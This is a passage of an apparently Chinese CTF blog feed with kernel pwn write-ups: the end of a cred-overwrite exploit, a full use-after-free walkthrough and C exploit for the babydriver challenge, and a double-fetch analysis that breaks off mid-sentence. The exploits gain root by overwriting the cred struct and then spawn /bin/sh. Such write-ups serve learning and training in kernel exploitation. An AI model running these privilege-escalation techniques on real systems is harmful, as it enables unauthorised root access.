root_cred[0]=0;</span><br><span class="line">        write_channel.id = alloc_channel.id;</span><br><span class="line">        write_channel.count= 1;</span><br><span class="line">        write_channel.buf = (char*)root_cred;</span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(getuid() == 0)&#123;</span><br><span class="line">        printf(&quot;[+] root now \n&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一种的解法还算常规，第二三种解法就很骚了，看着p4nda和raycp两位大师傅的博客学的，师傅们tql!🤩,另外两种会单独再写两篇post。周一还有考试，赶紧去复习了😭。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn UAF</title>
      <link href="/2020/11/09/kernel_pwn(3)/"/>
      <url>/2020/11/09/kernel_pwn(3)/</url>
      
        <content type="html"><![CDATA[<h3 id="kernel-pwn-UAF"><a href="#kernel-pwn-UAF" class="headerlink" title="kernel_pwn UAF"></a>kernel_pwn UAF</h3><blockquote><p>内核的UAF和用户态的差不多，不同的是内核使用的是slab&#x2F;slub分配器来管理堆块。<br>题目来源：ciscn2017_babydriver</p></blockquote><span id="more"></span><p>查看启动脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>开启了smep保护（内核态不可执行用户态的代码）。<br>查看init：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /prock</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>看到加载了babydriver.ko模块，也就是存在漏洞的lkm了，ida打开开始干活：<br>关键函数babyopen():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看到全局的结构体babydev_struct有两个成员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br></pre></td></tr></table></figure><p>每当打开一个设备时，都会通过kmalloc申请大小为0x40的内存其ptr赋给device_buf,0x40给到device_buf_len。由于它是定义在全局的结构体，我们每次open都会更新该struct的内容。<br>接下来baby_ioctl():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB, v3, v3);</span><br><span class="line">    result = <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先kfree掉struct里device_buf指向的内存，之后kamlloc大小可控的内存并更新结构体。<br>baby_write():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以向结构体里的device_buf写入内容。</p><p>baby_release():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>, filp, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>kfree掉device_buf，但没置0。</p><p>分析完我们可以发现问题就在于我们无论是什么操作都是基于这个babydev_struct结构体，但这个结构体是全局的，如果我们open两次的话第一次kmalloc的ptr就会被第二次kmalloc的ptr覆盖，也就是说我们无论是对fd1进行操作还是对fd2进行操作将会是同一块内存，如果close(fd1)而对fd2进行操作就可实现UAF的效果。</p><p>那该如何提权呢？容易想到劫持cred结构体改写uidgid，具体思路如下：<br>1.open两次得到fd1.fd2<br>2.利用ioctl改struct保存0xc8大小的堆块(cred结构体大小为0xa8)<br>3.close(fd1)此时0xa8大小的内存被kfree()<br>4.fork出子进程，在进程创建时会申请存放cred结构体的内存，此时刚被kfree的堆块被申请出来。<br>5.通过对fd2进行write操作改写cred结构体的uidgid&#x3D;0完成提权。</p><p>调试：<br>执行完第二步的结构体:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/20gx 0xffffffffc00024c9-1</span><br><span class="line">0xffffffffc00024c8:0x00000000000000000xffff880003ce16c0</span><br><span class="line">0xffffffffc00024d8:0x00000000000000a80x0000000000000000</span><br><span class="line">0xffffffffc00024e8:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>write前(已经劫持cred):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/20gx 0xffff880003ce16c0-0x10</span><br><span class="line">0xffff880003ce16b0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce16c0:0x000003e8000000020x000003e8000003e8</span><br><span class="line">0xffff880003ce16d0:0x000003e8000003e80x000003e8000003e8</span><br><span class="line">0xffff880003ce16e0:0x00000000000003e80x0000000000000000</span><br><span class="line">0xffff880003ce16f0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce1700:0x0000003fffffffff0x0000000000000000</span><br><span class="line">0xffff880003ce1710:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>write后:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/20gx 0xffff880003ce16c0-0x10</span><br><span class="line">0xffff880003ce16b0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce16c0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce16d0:0x00000000000000000x000003e800000000</span><br><span class="line">0xffff880003ce16e0:0x00000000000003e80x0000000000000000</span><br><span class="line">0xffff880003ce16f0:0x00000000000000000x0000000000000000</span><br><span class="line">0xffff880003ce1700:0x0000003fffffffff0x0000000000000000</span><br><span class="line">0xffff880003ce1710:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>对照内核cred结构体源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="type">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="type">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn Double_fetch</title>
      <link href="/2020/11/08/kernel_pwn(2)/"/>
      <url>/2020/11/08/kernel_pwn(2)/</url>
      
        <content type="html"><![CDATA[<h3 id="kernel-pwn-Double-fetch"><a href="#kernel-pwn-Double-fetch" class="headerlink" title="kernel_pwn Double_fetch"></a>kernel_pwn Double_fetch</h3><blockquote><p>wiki上kernel部分的第三道题目，来自0ctf2018 final_baby</p></blockquote><span id="more"></span><p>这题不太一样的是没有给bzlmage,只给了.ko文件和core.cpio。通过ida打开ko文件查看hex view可以发现内核版本为4.15.0-22-generic SMP mod_unload。<br>我偷懒直接从p4nda师傅的github上搞了一个，写个shell文件就可以qemu起了。</p><p>.ko文件分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__();</span><br><span class="line">  misc_register(&amp;baby);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init_module()里执行了misc_register()在&#x2F;dev目录下建立了baby结点，并定义为杂项设备，该设备共享主设备号和open函数调用，有点类似上一篇的core。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">baby_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// kr10_8</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0x6666</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag, v2, v3);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0x1337</span></span><br><span class="line">         &amp;&amp; (<span class="type">unsigned</span> __int8)_chk_range_not_ok(</span><br><span class="line">                               v2,</span><br><span class="line">                               <span class="number">16LL</span>,</span><br><span class="line">                               *(_QWORD *)(__readgsqword((<span class="type">unsigned</span> __int64)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">         &amp;&amp; (<span class="type">unsigned</span> __int8)_chk_range_not_ok(</span><br><span class="line">                               *(_QWORD *)v7,</span><br><span class="line">                               *(<span class="type">int</span> *)(v7 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(__readgsqword((<span class="type">unsigned</span> __int64)&amp;current_task) + <span class="number">4952</span>)) != <span class="number">1</span></span><br><span class="line">         &amp;&amp; *(_DWORD *)(v7 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">strlen</span>(flag) + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= v5 - <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v7 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag, flag, ~v5);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>baby_ioctl()就类似于main函数了，主要完成的功能是对第二个参数进行检查，若为0x6666，就输出内核里flag的地址；如果为0x1337就会进行三个检查_chk_range_not_ok()函数就是检查a1+a2&gt;a3是否成立。</p><p>寄存器状态：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$rdx   : 0x00007ffffffff000  →  0x00007ffffffff000</span><br><span class="line">$rsi   : 0x0000000000000010  →  0x0000000000000010</span><br><span class="line">$rdi   : 0x00007ffd64e1d780  →  0x00007ffd64e1d790  →  0x6373205d30383138  →  0x6373205d30383138</span><br><span class="line"></span><br><span class="line">gef➤  x/20gx 0x00007ffd64e1d780</span><br><span class="line">0x7ffd64e1d780:0x00007ffd64e1d7900x0000000000000021   //传入的结构体</span><br></pre></td></tr></table></figure><p>通过调试我们可以发现，v2&#x2F;v7就是是我们传入的结构体，而a3则是一个固定的地址0x7ffffffff000，这个地址是用户空间和内核空间的边界地址，因此我们可以想到该函数就是判断a1+a2的是否在用户空间。<br>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *flag;   <span class="comment">//flag的地址</span></span><br><span class="line">    <span class="type">size_t</span> flag_len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第一个check是我们输入的结构体是否在用户空间，第二个check是flag是否在用户空间，第三个check是我们结构体的flag_len是否和真正flag长度相等。<br>过了check之后会将我们输入的flag的地址里的内容和内核里的flag进行比较，相同最终就会输出flag。<br>分析下来我们发现，内核得到的是一个结构体的指针，而结构体的内容是存放在用户空间的。我们可以先通过0x6666得到flag在内核里的地址，但如果我们在传入的结构体里写入该地址的话就无法通过第二个check（因为该flag在内核空间）。这里就用到了doubel_fetch方法。<br>原理摘自CTF_WIKI：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Double Fetch 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。</span><br><span class="line"></span><br><span class="line">在 Linux 